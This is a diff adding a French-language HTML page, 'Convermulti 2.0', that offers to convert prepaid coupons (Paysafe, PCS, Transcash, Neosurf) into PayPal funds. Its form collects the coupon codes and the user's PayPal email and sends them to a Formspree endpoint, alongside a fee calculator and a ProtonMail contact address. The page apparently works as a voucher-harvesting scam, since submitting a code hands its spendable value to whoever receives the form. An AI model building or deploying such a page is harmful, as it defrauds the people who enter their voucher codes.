@@ -1,0 +1,213 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Convermulti 2.0 - Conversion</title>
+    <style>
+        body {
+            font-family: 'Arial', sans-serif;
+            background-color: #5e2a84;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+            text-align: center;
+            height: 100vh;
+        }
+        header {
+            background-color: #3b1c58;
+            padding: 20px 0;
+        }
+        h1 {
+            font-size: 3em;
+            font-style: italic;
+            letter-spacing: 1px;
+        }
+        .container {
+            margin: 50px auto;
+            background-color: rgba(255, 255, 255, 0.1);
+            padding: 30px;
+            border-radius: 10px;
+            max-width: 600px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+        }
+        label {
+            font-size: 1.2em;
+            display: block;
+            margin-top: 20px;
+        }
+        input, select {
+            width: 100%;
+            padding: 15px;
+            margin-top: 10px;
+            border-radius: 5px;
+            border: 2px solid #fff;
+            font-size: 1em;
+            background-color: #fff;
+            color: #333;
+        }
+        button {
+            background-color: #4CAF50;
+            color: white;
+            padding: 15px 30px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .result {
+            background-color: #3b1c58;
+            color: #fff;
+            padding: 15px;
+            margin-top: 20px;
+            border-radius: 10px;
+        }
+        footer {
+            background-color: #3b1c58;
+            padding: 20px;
+            margin-top: 50px;
+        }
+        .faq h2 {
+            font-style: italic;
+            color: #FFD700;
+        }
+        .faq {
+            padding: 20px;
+            background-color: rgba(255, 255, 255, 0.1);
+            margin-top: 30px;
+            border-radius: 10px;
+        }
+        #contact-button {
+            background-color: #ff4500;
+            color: white;
+            padding: 15px;
+            border: none;
+            border-radius: 5px;
+            font-size: 1.2em;
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            cursor: pointer;
+        }
+
+        #contact-button:hover {
+            background-color: #e63946;
+        }
+
+        #contact-bubble {
+            display: none;
+            position: fixed;
+            bottom: 80px;
+            right: 20px;
+            background-color: #3b1c58;
+            color: white;
+            padding: 15px;
+            border-radius: 10px;
+            font-size: 1.2em;
+        }
+    </style>
+    <script src="https://www.google.com/recaptcha/enterprise.js?render=6LdLVYUqAAAAAM2nZec4d5FF_jpmamRuQAeGOwhY"></script>
+</head>
+<body>
+
+<header>
+    <img src="images/logo.png" alt="Logo Convermulti 2.0" style="width: 150px;">
+    <h1>Bienvenue sur Convermulti 2.0</h1>
+</header>
+
+<div class="container">
+    <h2>Calculateur de Conversion</h2>
+    <p>Convertissez vos coupons en PayPal de manière simple et rapide.</p>
+    
+    <form action="https://formspree.io/f/xldelwdb" method="POST" id="conversion-form">
+        <label for="montant">Entrez le montant à convertir (en euros) :</label>
+        <input type="number" id="montant" name="montant" placeholder="Ex: 50" oninput="calculerMontant()">
+
+        <label for="type-coupon">Sélectionnez le type de coupon :</label>
+        <select id="type-coupon" name="typeCoupon" onchange="calculerMontant()">
+            <option value="Paysafe">Paysafe</option>
+            <option value="PCs">PCs</option>
+            <option value="Transcash">Transcash</option>
+            <option value="Neosurf">Neosurf</option>
+        </select>
+
+        <label for="code">Entrez le code du coupon :</label>
+        <input type="text" id="code" name="code" placeholder="Entrez le code du coupon">
+
+        <label for="email">Entrez votre email PayPal :</label>
+        <input type="text" id="email" name="email" placeholder="Ex: votre.email@paypal.com">
+
+        <button type="button" class="g-recaptcha" data-sitekey="6LdLVYUqAAAAAM2nZec4d5FF_jpmamRuQAeGOwhY" data-callback="onSubmit" data-action="submit">Convertir</button>
+    </form>
+
+    <div class="result" id="resultat">
+        <p><strong>Montant à convertir :</strong> <span id="montant-texte">0</span> €</p>
+        <p><strong>Frais :</strong> <span id="frais">0</span> €</p>
+        <p><strong>Montant final après conversion :</strong> <span id="montant-final">0</span> €</p>
+    </div>
+
+</div>
+
+<div class="faq">
+    <h2>Guide d'Utilisation</h2>
+    <p>Pour une expérience optimale, veuillez suivre les étapes détaillées ci-dessous pour réaliser une conversion efficace :</p>
+    <ul>
+        <li><strong>Étape 1 :</strong> Saisissez le montant que vous souhaitez convertir dans la première case. Assurez-vous que ce montant est correct avant de poursuivre.</li>
+        <li><strong>Étape 2 :</strong> Sélectionnez le type de coupon que vous utilisez parmi les options disponibles : Paysafe, PCs, Transcash ou Neosurf.</li>
+        <li><strong>Étape 3 :</strong> Entrez le code de coupon que vous avez reçu dans la case dédiée. Veillez à ce que ce code soit exact.</li>
+        <li><strong>Étape 4 :</strong> Fournissez l'adresse email associée à votre compte PayPal pour permettre la réception des fonds après la conversion.</li>
+        <li><strong>Étape 5 :</strong> Cliquez sur le bouton "Convertir" pour afficher le montant final après application des frais. Vous recevrez également un récapitulatif des frais appliqués.</li>
+    </ul>
+    <p>Assurez-vous de vérifier toutes les informations avant de soumettre le formulaire. En cas de doute, n'hésitez pas à nous contacter pour toute question.</p>
+</div>
+
+<footer>
+    <p>&copy; 2024 Convermulti 2.0 - Tous droits réservés.</p>
+</footer>
+
+<!-- Bulle Contact -->
+<div id="contact-bubble">
+    <p>Email de contact: <a href="mailto:coverti.miro@proton.me" style="color: white; text-decoration: underline;">coverti.miro@proton.me</a></p>
+</div>
+
+<!-- Bouton Contact -->
+<button id="contact-button" onclick="toggleContactBubble()">Contact</button>
+
+<script>
+    function calculerMontant() {
+        const montant = document.getElementById("montant").value;
+        const typeCoupon = document.getElementById("type-coupon").value;
+
+        let frais = 0;
+        let montantFinal = montant;
+
+        if (montant > 30) {
+            frais = 0;
+        } else {
+            frais = montant * 0.1; // 10% de frais si le montant est inférieur à 30€
+        }
+
+        montantFinal = montant - frais;
+
+        // Afficher le résultat
+        document.getElementById("montant-texte").innerText = montant;
+        document.getElementById("frais").innerText = frais.toFixed(2);
+        document.getElementById("montant-final").innerText = montantFinal.toFixed(2);
+    }
+
+    function toggleContactBubble() {
+        const bubble = document.getElementById("contact-bubble");
+        bubble.style.display = bubble.style.display === 'none' || bubble.style.display === '' ? 'block' : 'none';
+    }
+
+    function onSubmit(token) {
+        document.getElementById("conversion-form").submit();
+    }
+</script>
+
+</body>
+</html>
